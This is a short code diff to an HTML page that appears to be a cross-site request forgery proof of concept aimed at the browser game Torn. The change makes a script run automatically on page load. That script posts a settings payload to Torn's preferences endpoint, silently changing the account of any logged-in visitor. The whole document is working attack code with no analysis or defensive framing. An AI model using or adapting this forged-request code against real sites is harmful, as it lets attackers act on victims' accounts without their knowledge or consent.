@@ -1,4 +1,6 @@
-  <script>
+<body onload="my()">
+<script>
+function my() {
   var post_data = 'ajax=step_settings&rfc=&textnames=0&pv=0&reviving=1&widgets=0';
   var xmlhttp=new XMLHttpRequest();
   xmlhttp.open("POST", 'https://www.torn.com/preferences.php', true);
@@ -9,4 +11,5 @@
   }
   };
   xmlhttp.send(post_data);
-  </script>
+}
+</script>
